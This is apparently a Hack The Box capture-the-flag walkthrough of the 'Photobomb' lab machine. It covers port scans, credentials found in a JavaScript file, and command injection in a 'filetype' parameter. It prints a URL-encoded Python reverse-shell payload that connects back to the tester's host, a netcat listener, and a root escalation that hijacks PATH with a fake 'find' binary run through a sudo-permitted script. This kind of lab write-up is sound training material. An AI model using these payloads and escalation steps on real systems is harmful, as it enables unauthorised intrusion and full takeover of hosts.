# Hack The Box - Photobomb Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Photobomb]
└─$ sudo nmap -sC -sV -sT -O -oA nmap/initial 10.10.11.182 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 05:46 EST
Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 49.50% done; ETC: 05:50 (0:01:42 remaining)
Stats: 0:04:56 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 68.62% done; ETC: 05:53 (0:02:15 remaining)
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.50s latency).                                                                                                                                 
Not shown: 997 closed tcp ports (conn-refused)                                                                                                              
PORT     STATE    SERVICE VERSION                                                                                                                           
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                      
| ssh-hostkey:                                                                                                                                              
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)                                                                                              
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)                                                                                             
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)                                                                                           
80/tcp   open     http    nginx 1.18.0 (Ubuntu)                                                                                                             
|_http-title: Photobomb                                                                                                                                     
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                 
3690/tcp filtered svn                                                                                                                                       
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                         
TCP/IP fingerprint:                                                                                                                                         
OS:SCAN(V=7.92%E=4%D=1/28%OT=22%CT=1%CU=36113%PV=Y%DS=2%DC=I%G=Y%TM=63D5017                                                                                 
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=1                                                                                 
OS:05%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O                                                                                 
OS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=                                                                                 
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSN                                                                                 
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D                                                                                 
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O                                                                                 
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W                                                                                 
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R                                                                                 
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)                                                                                                              
                                                                                                                                                            
Network Distance: 2 hops                                                                                                                                    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                     
                                                                                                                                                            
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                       
Nmap done: 1 IP address (1 host up) scanned in 1120.72 seconds   
```

So, we got `two` ports open
- Port `22`: running `OpenSSH 8.2p1 `
- Port `80`: runninng `nginx 1.18.0`

So Now, I ran `Rustscan` that covers all ports. The idea behind using `Rustscan` is that it is faster compared to Nmap since `Rustscan` using Multi-threading but doesnt have service, OS, script scan features. So, I basically used `Rustscan` to find open ports and If I find them, i'll only scan those ports for services, version & OS detection using Nmap, making it faster and much efficient.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Photobomb]
└─$ rustscan -a 10.10.11.182 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.182:22
Open 10.10.11.182:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.182

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 06:13 EST
Initiating Ping Scan at 06:13
Scanning 10.10.11.182 [2 ports]
Completed Ping Scan at 06:13, 3.03s elapsed (1 total hosts)
Nmap scan report for 10.10.11.182 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.07 seconds
```

## Enumeration
Now, that I know Port `80` will be the only way to enumerate this machine going forward, I visted the website. 

As soon as I entered the IP address in the URL, it changed to `photobomb.htb`, so I added the hostname and IP address to `/etc/hosts` file
```
sudo echo 10.10.11.182 photobomb >> /etc/hosts
```

The visiting webpage was as following, and there was a `click here` link, which on clicking presented a `login` prompt to me.

![pb-1](https://user-images.githubusercontent.com/87711310/215263438-79f3464a-9d69-4604-b30e-38a04282fa65.png)

Since, I didnt know any credentials, I tried common credentials and they did not work.

So, I looked at the source-code, and found an interesting `.js` file

![pb-2](https://user-images.githubusercontent.com/87711310/215263442-4808c2e0-24dd-4896-b851-8d3cca1f3c64.png)

Looking at the contents of `photobomb.js` file, I found `username:password` combination in a `wierd email format`. 

![pb-3](https://user-images.githubusercontent.com/87711310/215263440-88af22be-63b0-4e2d-8b53-c24888f55928.png)

Since, there was nothing else than a `login` page that I encountered, I decided to use these credentials to check whether I could sign-in to the `/printer` page.

And guess what? we did sign in to the website!! Once, we're signed in, I was in the `/printer` directory of the website and could see a couple of things

![pb-4](https://user-images.githubusercontent.com/87711310/215263444-3c196b5f-a89c-43d7-894e-a11ec6ec7541.png)

There was also a functionality to select the image type (.raw, .jpg, etc.) and even a button to download the images

![pb-5](https://user-images.githubusercontent.com/87711310/215263446-9d9a2e7b-619f-4ed4-a647-cbaa38d679c0.png)

So, now I captured the request in `Burp` and try some `command injection` in all the parameters since I didnt know which parameter was vulnerable.

![pr-6](https://user-images.githubusercontent.com/87711310/215265132-60dc96ba-def7-4fad-9fc5-e775eef7dec5.png)

Before that I hosted a web-server on my machine to provide a file for the request to access.

Once I sent the request, I got an error for dimensions, which confirms that there was no vulnerability in `dimensions` parameter


![pr-7](https://user-images.githubusercontent.com/87711310/215265347-cc243110-e307-445c-80f3-b2987eea6761.png)

So, I removed the payload from `dimensions` parameter and sent the request with the payload in only `filetype` parameter and we got a hit!

The request gave an error.

![pr-8 1](https://user-images.githubusercontent.com/87711310/215265323-3c838f21-e3de-4014-8d34-902c9a044ba2.png)

But we got a hit on our server.

![pr-8 2](https://user-images.githubusercontent.com/87711310/215265322-29b7dded-9d21-4c96-ba18-e7628ec7b1e4.png)

Now that I know this parameter is vulnerable to `command injection`, I decided to get a reverse shell to my machine

## Exploitation

Firstly, I tried the `bash` payload, but it didn't seem to work, so, I decided to use `python` one instead

```python
%3bexport+RHOST%3d"10.10.16.2"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
```

Before sending the request, I turned on the `netcat` listener
```
nc -lvnp 9001
```

Once I sent the request, I immediately got back the shell with a user `wizard`
```
Once┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Photobomb]
└─$ nc -lvnp 9001    
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.182] 54824
$ whoami
whoami
wizard
$ 
```

Then, I made it an interactive shell
```python
python3 -c "import pty;pty.spawn('/bin/bash')" 
```

Then, I moved on to retrieve the `user` flag

```
wizard@photobomb:~/photobomb$ cd /home
cd /home
wizard@photobomb:/home$ ls
ls
wizard
wizard@photobomb:/home$ cd wizard
cd wizard
wizard@photobomb:~$ ls
ls
photobomb  user.txt
wizard@photobomb:~$ cat user.txt
cat user.txt
[REDACTED]

```

## Privilege Escalation
Now, before using `Linpeas`, I always check what services could be ran as `root` users with the `sudo -l` command

Seems like we can run `cleanup.sh` with `root` permission. So let’s try to view the contents of `cleanup.sh` for any possibilities to gain `root` privilege

```
wizard@photobomb:~$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

It's just a simple `bash` file, what we can do is add `bash` in the file and execute it with `root` permission to give us a `root` shell

```
wizard@photobomb:~$ echo bash >> /opt/cleanup.sh
echo bash >> /opt/cleanup.sh
bash: /opt/cleanup.sh: Permission denied
wizard@photobomb:~$ echo bash > find
echo bash > find
wizard@photobomb:~$ chmod +x find
chmod +x find
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
whoami
root
```

Now, I was not directly able to add bash to the `cleanup.sh` file, so I added it to `find` and then executed the `bash` file

```
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
cat /root/root.txt                                                                                                                                                                                                                                                                                                          
[REDACTED]
```

And we can get the `user` flag!!!
